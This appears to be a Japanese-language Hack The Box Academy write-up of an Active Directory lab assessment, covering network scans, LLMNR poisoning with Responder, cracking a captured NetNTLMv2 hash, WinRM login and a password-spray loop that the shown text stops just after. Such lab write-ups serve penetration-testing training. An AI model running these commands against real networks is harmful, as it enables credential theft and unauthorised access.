---
{"dg-publish":true,"permalink":"/hack-the-box-academy/active-directory-enumeration-and-attacks-ad-enumeration-and-attacks-skills-assessment-part-ii/","noteIcon":""}
---

![HTB Banner](https://github.com/hackthebox/writeup-templates/blob/master/machine/assets/images/banner.png?raw=true)


- URL : 
- #easy #medium #hard #insane
- OS : #Linux #Windows
- Machine Author(s): 
- Hack Date: 2025-04-09,09:24

---
# Scenario
私たちのクライアントであるInlanefreightは、フルスコープの内部浸透試験を行うために再び私たちを契約しました。クライアントは、合併と買収のプロセスを経る前に、できるだけ多くの欠陥を見つけて修復しようとしています。新しいCISOは、以前の侵入テストで気づかれなかった可能性のある、より微妙なADセキュリティの欠陥を特に心配しています。クライアントはステルス/回避戦術を心配せず、ネットワークとActive Directory環境のすべての角度を可能な限り最高のカバレッジを得るために、内部ネットワーク内のParrot Linux VMも提供しました。SSH経由で内部攻撃ホストに接続し（このモジュールの冒頭に示すように`xfreerdp`を使用して接続することもできます）、ドメインへの足場を探し始めます。足場ができたら、ドメインを列挙し、横方向に移動したり、特権をエスカレートしたり、ドメインの妥協を達成したりするために利用できる欠陥を探します。

このモジュールで学習した内容を応用して、ドメインを妥協点にし、以下の質問に答えて、スキル評価のパート II を完了してください。
# Enumeration
Principle
1. **目に見えるものだけがすべてではない。** あらゆる視点を考慮しろ
2. 見えていることと、見えていないことを区別しろ
3. **常に情報を得る手段は存在する。** 対象をしっかり理解しろ

## ホストの探索

### Responder

```sh
└──╼ #sudo responder -I ens224 -A 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.6.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [ON]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Fingerprint hosts          [OFF]

[+] Generic Options:
    Responder NIC              [ens224]
    Responder IP               [172.16.7.240]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-4DGNQ2FHHRY]
    Responder Domain Name      [OSJH.LOCAL]
    Responder DCE-RPC Port     [47801]
[i] Responder is in analyze mode. No NBT-NS, LLMNR, MDNS requests will be poisoned.
[Analyze mode: ICMP] You can ICMP Redirect on this network.
[Analyze mode: ICMP] This workstation (172.16.7.240) is not on the same subnet than the DNS server (1.1.1.1).
[Analyze mode: ICMP] Use `python tools/Icmp-Redirect.py` for more details.
[Analyze mode: ICMP] You can ICMP Redirect on this network.
[Analyze mode: ICMP] This workstation (172.16.7.240) is not on the same subnet than the DNS server (8.8.8.8).
[Analyze mode: ICMP] Use `python tools/Icmp-Redirect.py` for more details.
[!] Error starting TCP server on port 3389, check permissions or other servers running.

[+] Listening for events...

[Analyze mode: MDNS] Request by 172.16.7.3 for INLANEFRIGHT.LOCAL, ignoring
[Analyze mode: LLMNR] Request by 172.16.7.3 for INLANEFRIGHT, ignoring
[Analyze mode: LLMNR] Request by 172.16.7.3 for INLANEFRIGHT, ignoring
[Analyze mode: MDNS] Request by 172.16.7.3 for INLANEFRIGHT.LOCAL, ignoring
[Analyze mode: LLMNR] Request by 172.16.7.3 for INLANEFRIGHT, ignoring
[Analyze mode: LLMNR] Request by 172.16.7.3 for INLANEFRIGHT, ignoring
[Analyze mode: MDNS] Request by 172.16.7.3 for INLANEFRIGHT.LOCAL, ignoring
[Analyze mode: LLMNR] Request by 172.16.7.3 for INLANEFRIGHT, ignoring
[Analyze mode: LLMNR] Request by 172.16.7.3 for INLANEFRIGHT, ignoring
[Analyze mode: MDNS] Request by 172.16.7.3 for INLANEFRIGHT.LOCAL, ignoring
[Analyze mode: LLMNR] Request by 172.16.7.3 for INLANEFRIGHT, ignoring
[Analyze mode: LLMNR] Request by 172.16.7.3 for INLANEFRIGHT, ignoring
[Analyze mode: MDNS] Request by 172.16.7.3 for INLANEFRIGHT.LOCAL, ignoring
[Analyze mode: LLMNR] Request by 172.16.7.3 for INLANEFRIGHT, ignoring
[Analyze mode: LLMNR] Request by 172.16.7.3 for INLANEFRIGHT, ignoring
[Analyze mode: MDNS] Request by 172.16.7.3 for INLANEFRIGHT.LOCAL, ignoring
[Analyze mode: LLMNR] Request by 172.16.7.3 for INLANEFRIGHT, ignoring
[Analyze mode: LLMNR] Request by 172.16.7.3 for INLANEFRIGHT, ignoring
[Analyze mode: MDNS] Request by 172.16.7.3 for INLANEFRIGHT.LOCAL, ignoring
[Analyze mode: LLMNR] Request by 172.16.7.3 for INLANEFRIGHT, ignoring
[Analyze mode: LLMNR] Request by 172.16.7.3 for INLANEFRIGHT, ignoring
```

### fping
```sh
└──╼ #fping -asgq 172.16.7.0/23
172.16.7.3
172.16.7.50
172.16.7.60
172.16.7.240

     510 targets
       4 alive
     506 unreachable
       0 unknown addresses

    2024 timeouts (waiting for response)
    2028 ICMP Echos sent
       4 ICMP Echo Replies received
    2024 other ICMP received

 0.087 ms (min round trip time)
 0.883 ms (avg round trip time)
 1.66 ms (max round trip time)
       14.704 sec (elapsed real time)

```

## それぞれのマシンの詳細情報
### 172.16.7.60
```sh
PORT      STATE SERVICE       REASON          VERSION
135/tcp   open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 128 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack ttl 128
1433/tcp  open  ms-sql-s      syn-ack ttl 128 Microsoft SQL Server 2019 15.00.2000
5985/tcp  open  http          syn-ack ttl 128 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http          syn-ack ttl 128 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49671/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
MAC Address: 00:50:56:B0:60:F8 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows 10 1709 - 1909 (96%), Microsoft Windows 10 1709 - 1803 (93%), Microsoft Windows Longhorn (92%), Microsoft Windows Vista SP1 (92%), Microsoft Windows Server 2012 (91%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (91%), Microsoft Windows 10 1703 (91%), Microsoft Windows 8 (90%), Microsoft Windows Server 2012 R2 Update 1 (90%), Microsoft Windows Server 2016 build 10586 - 14393 (90%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.92%E=4%D=4/8%OT=135%CT=%CU=30068%PV=Y%DS=1%DC=D%G=N%M=005056%TM=67F5C449%P=x86_64-pc-linux-gnu)
SEQ(SP=106%GCD=1%ISR=106%TI=I%CI=RD%II=I%SS=S%TS=U)
OPS(O1=M5B4NW8NNS%O2=M5B4NW8NNS%O3=M5B4NW8%O4=M5B4NW8NNS%O5=M5B4NW8NNS%O6=M5B4NNS)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)
ECN(R=Y%DF=Y%T=80%W=FFFF%O=M5B4NW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)
T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)
T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE
HOP RTT       ADDRESS
1   316.76 ms 172.16.7.60

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 20:50
Completed NSE at 20:50, 0.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 20:50
Completed NSE at 20:50, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 93.04 seconds
           Raw packets sent: 47 (3.480KB) | Rcvd: 47 (3.200KB)

```

#### SQL01.INLANEFREIGHT.LOCAL
```sh
└──╼ $sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 172.16.7.60
Starting Nmap 7.92 ( https://nmap.org ) at 2025-04-08 21:10 EDT
Nmap scan report for 172.16.7.60
Host is up (0.00037s latency).

PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: INLANEFREIGHT
|   NetBIOS_Domain_Name: INLANEFREIGHT
|   NetBIOS_Computer_Name: SQL01
|   DNS_Domain_Name: INLANEFREIGHT.LOCAL
|   DNS_Computer_Name: SQL01.INLANEFREIGHT.LOCAL
|   DNS_Tree_Name: INLANEFREIGHT.LOCAL
|_  Product_Version: 10.0.17763
MAC Address: 00:50:56:B0:60:F8 (VMware)

Host script results:
| ms-sql-info: 
|   Windows server name: SQL01
|   172.16.7.60\SQLEXPRESS: 
|     Instance name: SQLEXPRESS
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|     TCP port: 1433
|_    Clustered: false

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.81 seconds

```

### 172.16.7.50
```sh
└──╼ $Target_IP="172.16.7.50"
┌─[htb-student@skills-par01]─[~]
└──╼ $sudo nmap -p0-65535 -T4 -Pn -v --open $Target_IP -oG open_ports.txt
ports=$(grep "Ports:" open_ports.txt | awk -F'Ports: ' '{print $2}' | tr ',' '\n' | awk -F'/' '{print $1}' | tr '\n' ',' | sed 's/,$//')
sudo nmap -sCV -A -Pn -p"$ports" -vv $Target_IP --script banner.nse

PORT      STATE SERVICE       REASON          VERSION
135/tcp   open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 128 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack ttl 128
3389/tcp  open  ms-wbt-server syn-ack ttl 128 Microsoft Terminal Services
5985/tcp  open  http          syn-ack ttl 128 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http          syn-ack ttl 128 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49671/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49672/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
MAC Address: 00:50:56:B0:7F:19 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows 10 1709 - 1909 (97%), Microsoft Windows 10 1709 - 1803 (94%), Microsoft Windows Longhorn (92%), Microsoft Windows Server 2012 (92%), Microsoft Windows Vista SP1 (92%), Microsoft Windows Server 2012 R2 Update 1 (91%), Microsoft Windows Server 2016 build 10586 - 14393 (91%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (91%), Microsoft Windows 10 1703 (91%), Microsoft Windows 10 1809 - 1909 (91%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.92%E=4%D=4/8%OT=135%CT=%CU=34936%PV=Y%DS=1%DC=D%G=N%M=005056%TM=67F5C1D5%P=x86_64-pc-linux-gnu)
SEQ(SP=105%GCD=1%ISR=108%TI=I%CI=I%II=I%SS=S%TS=U)
OPS(O1=M5B4NW8NNS%O2=M5B4NW8NNS%O3=M5B4NW8%O4=M5B4NW8NNS%O5=M5B4NW8NNS%O6=M5B4NNS)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)
ECN(R=Y%DF=Y%T=80%W=FFFF%O=M5B4NW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)
T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)
T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE
HOP RTT     ADDRESS
1   2.17 ms 172.16.7.50

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 20:39
Completed NSE at 20:39, 0.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 20:39
Completed NSE at 20:39, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 90.95 seconds
           Raw packets sent: 48 (3.524KB) | Rcvd: 49 (3.284KB)

```
#### MS01
```sh
┌─[✗]─[root@skills-par01]─[/home/htb-student]
└──╼ #nmblookup -A 172.16.7.50
Looking up status of 172.16.7.50
	MS01            <00> -         B <ACTIVE> 
	INLANEFREIGHT   <00> - <GROUP> B <ACTIVE> 
	MS01            <20> -         B <ACTIVE> 

	MAC Address = 00-50-56-B0-7F-19

```

### 172.16.7.3 - DC01
```sh
┌─[htb-student@skills-par01]─[~]
└──╼ $Target_IP="172.16.7.3"
┌─[htb-student@skills-par01]─[~]
└──╼ $sudo nmap -p0-65535 -T4 -Pn -v --open $Target_IP -oG open_ports.txt
ports=$(grep "Ports:" open_ports.txt | awk -F'Ports: ' '{print $2}' | tr ',' '\n' | awk -F'/' '{print $1}' | tr '\n' ',' | sed 's/,$//')
sudo nmap -sCV -A -Pn -p"$ports" -vv $Target_IP --script banner.nse
<SNIP>

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 128 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 128 Microsoft Windows Kerberos (server time: 2025-04-09 00:23:43Z)
135/tcp   open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 128 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 128 Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 128
464/tcp   open  kpasswd5?     syn-ack ttl 128
593/tcp   open  ncacn_http    syn-ack ttl 128 Microsoft Windows RPC over HTTP 1.0
|_banner: ncacn_http/1.0
636/tcp   open  tcpwrapped    syn-ack ttl 128
3268/tcp  open  ldap          syn-ack ttl 128 Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 128
5985/tcp  open  http          syn-ack ttl 128 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 128 .NET Message Framing
47001/tcp open  http          syn-ack ttl 128 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49678/tcp open  ncacn_http    syn-ack ttl 128 Microsoft Windows RPC over HTTP 1.0
|_banner: ncacn_http/1.0
49679/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49684/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49699/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49747/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
MAC Address: 00:50:56:B0:D1:16 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows 10 1709 - 1909 (97%), Microsoft Windows 10 1709 - 1803 (94%), Microsoft Windows Server 2012 (92%), Microsoft Windows Vista SP1 (92%), Microsoft Windows Longhorn (92%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (91%), Microsoft Windows 10 1703 (91%), Microsoft Windows 10 1809 - 1909 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 R2 Update 1 (91%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.92%E=4%D=4/8%OT=53%CT=%CU=40685%PV=Y%DS=1%DC=D%G=N%M=005056%TM=67F5BE50%P=x86_64-pc-linux-gnu)
SEQ(SP=109%GCD=1%ISR=10B%TI=I%CI=I%II=I%SS=S%TS=U)
OPS(O1=M5B4NW8NNS%O2=M5B4NW8NNS%O3=M5B4NW8%O4=M5B4NW8NNS%O5=M5B4NW8NNS%O6=M5B4NNS)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)
ECN(R=Y%DF=Y%T=80%W=FFFF%O=M5B4NW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)
T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)
T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=265 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE
HOP RTT     ADDRESS
1   1.41 ms inlanefreight.local (172.16.7.3)

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 20:24
Completed NSE at 20:24, 0.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 20:24
Completed NSE at 20:24, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 73.38 seconds
           Raw packets sent: 57 (3.920KB) | Rcvd: 57 (3.640KB)

```

## 認証情報の探索
AB920というユーザーの認証情報が取得できる
```sh
└──╼ #sudo responder -I ens224
<SNIP>
[+] Current Session Variables:
    Responder Machine Name     [WIN-KEHL5CD901F]
    Responder Domain Name      [V7NX.LOCAL]
    Responder DCE-RPC Port     [47891]

[+] Listening for events...

[*] [MDNS] Poisoned answer sent to 172.16.7.3      for name INLANEFRIGHT.LOCAL
[*] [LLMNR]  Poisoned answer sent to 172.16.7.3 for name INLANEFRIGHT
[*] [LLMNR]  Poisoned answer sent to 172.16.7.3 for name INLANEFRIGHT
[*] [MDNS] Poisoned answer sent to 172.16.7.3      for name INLANEFRIGHT.LOCAL
[*] Skipping previously captured hash for INLANEFREIGHT\AB920

```


```sh
┌─[root@skills-par01]─[/home/htb-student]
└──╼ #cat /usr/share/responder/logs/SMB-NTLMv2-SSP-172.16.7.3.txt

AB920::INLANEFREIGHT:895a86f108505253:944379A01CC28E18814432028CB1E1B9:010100000000000080726B5CC9A8DB013F6F4F20EA10406B0000000002000800560037004E00580001001E00570049004E002D004B00450048004C00350043004400390030003100460004003400570049004E002D004B00450048004C0035004300440039003000310046002E00560037004E0058002E004C004F00430041004C0003001400560037004E0058002E004C004F00430041004C0005001400560037004E0058002E004C004F00430041004C000700080080726B5CC9A8DB0106000400020000000800300030000000000000000000000000200000E724BAE74D3BE6D9FA134703ABDAC2E59BAB6BD8D8148656184FC93607043E730A0010000000000000000000000000000000000009002E0063006900660073002F0049004E004C0041004E0045004600520049004700480054002E004C004F00430041004C00000000000000000000000000
```

hashのクラック
```sh
┌─[us-academy-3]─[10.10.14.205]─[htb-ac-1632385@htb-osvkcctn38]─[~]
└──╼ [★]$ echo 'AB920::INLANEFREIGHT:895a86f108505253:944379A01CC28E18814432028CB1E1B9:010100000000000080726B5CC9A8DB013F6F4F20EA10406B0000000002000800560037004E00580001001E00570049004E002D004B00450048004C00350043004400390030003100460004003400570049004E002D004B00450048004C0035004300440039003000310046002E00560037004E0058002E004C004F00430041004C0003001400560037004E0058002E004C004F00430041004C0005001400560037004E0058002E004C004F00430041004C000700080080726B5CC9A8DB0106000400020000000800300030000000000000000000000000200000E724BAE74D3BE6D9FA134703ABDAC2E59BAB6BD8D8148656184FC93607043E730A0010000000000000000000000000000000000009002E0063006900660073002F0049004E004C0041004E0045004600520049004700480054002E004C004F00430041004C00000000000000000000000000' > hash.txt


┌─[us-academy-3]─[10.10.14.205]─[htb-ac-1632385@htb-osvkcctn38]─[~]
└──╼ [★]$ hashcat hash.txt /usr/share/wordlists/rockyou.txt 

AB920::INLANEFREIGHT:895a86f108505253:944379a01cc28e18814432028cb1e1b9:010100000000000080726b5cc9a8db013f6f4f20ea10406b0000000002000800560037004e00580001001e00570049004e002d004b00450048004c00350043004400390030003100460004003400570049004e002d004b00450048004c0035004300440039003000310046002e00560037004e0058002e004c004f00430041004c0003001400560037004e0058002e004c004f00430041004c0005001400560037004e0058002e004c004f00430041004c000700080080726b5cc9a8db0106000400020000000800300030000000000000000000000000200000e724bae74d3be6d9fa134703abdac2e59bab6bd8d8148656184fc93607043e730a0010000000000000000000000000000000000009002e0063006900660073002f0049004e004c0041004e0045004600520049004700480054002e004c004f00430041004c00000000000000000000000000:weasal
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: AB920::INLANEFREIGHT:895a86f108505253:944379a01cc28...000000
Time.Started.....: Tue Apr  8 20:24:36 2025 (0 secs)
Time.Estimated...: Tue Apr  8 20:24:36 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#2.........:  1892.2 kH/s (0.85ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 290816/14344385 (2.03%)
Rejected.........: 0/290816 (0.00%)
Restore.Point....: 288768/14344385 (2.01%)
Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#2....: winers -> temyong

Started: Tue Apr  8 20:24:27 2025
Stopped: Tue Apr  8 20:24:37 2025

```

### 得られた認証情報
AB920:weasal
# MS01への侵入
## 認証情報を元に侵入
```sh
┌─[root@skills-par01]─[/home/htb-student]
└──╼ #crackmapexec winrm 172.16.7.50 -u AB920 -p weasal
WINRM       172.16.7.50     5985   NONE             [*] None (name:172.16.7.50) (domain:None)
WINRM       172.16.7.50     5985   NONE             [*] http://172.16.7.50:5985/wsman
WINRM       172.16.7.50     5985   NONE             [+] None\AB920:weasal (Pwn3d!)
┌─[root@skills-par01]─[/home/htb-student]
└──╼ #evil-winrm -i 172.16.7.50 -u AB920 -p weasal

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\AB920\Documents> 

```


## MS01での他の認証情報の探索
```sh
└──╼ $rpcclient -U "AB920" 172.16.7.50
Enter WORKGROUP\AB920's password: 
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE

```

```sh
┌─[✗]─[htb-student@skills-par01]─[~]
└──╼ $crackmapexec smb 172.16.7.60 -u AB920 -p weasal --shares
smbmap -u AB920 -p weasal -H 172.16.7.60
SMB         172.16.7.60     445    SQL01            [*] Windows 10.0 Build 17763 x64 (name:SQL01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
SMB         172.16.7.60     445    SQL01            [+] INLANEFREIGHT.LOCAL\AB920:weasal 
SMB         172.16.7.60     445    SQL01            [+] Enumerated shares
SMB         172.16.7.60     445    SQL01            Share           Permissions     Remark
SMB         172.16.7.60     445    SQL01            -----           -----------     ------
SMB         172.16.7.60     445    SQL01            ADMIN$                          Remote Admin
SMB         172.16.7.60     445    SQL01            C$                              Default share
SMB         172.16.7.60     445    SQL01            IPC$            READ            Remote IPC
[!] Authentication error on 172.16.7.60
```

### パスワードスプレー攻撃
パスワードスプレー攻撃の前準備
- パスワードポリシーの確認
```sh
*Evil-WinRM* PS C:\Users\AB920\Documents> net accounts
Force user logoff how long after time expires?:       Never
Minimum password age (days):                          0
Maximum password age (days):                          42
Minimum password length:                              1
Length of password history maintained:                None
Lockout threshold:                                    Never
Lockout duration (minutes):                           30
Lockout observation window (minutes):                 30
Computer role:                                        SERVER
The command completed successfully.

```

ユーザー名の辞書の作成
```sh
┌─[htb-student@skills-par01]─[~]
└──╼ $crackmapexec smb 172.16.7.3 -u AB920 -p weasal --users 2>/dev/null | grep -oP '\\\K[^ ]+' > users.txt
```

上のコマンドで以下のようなユーザー名の辞書を作れる
```sh
cat users.txt

<SNIP>
HK954
AB748
YN368
YL119
svc_sccm
AB920
CT059
BR086
mssqlsvc
```


これで実行すると以下のようなパスワードスプレー攻撃を行うと、以下のアカウントが見つかった
```sh
┌─[htb-student@skills-par01]─[~]
└──╼ $for u in $(cat users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.7.3| grep Authority; done
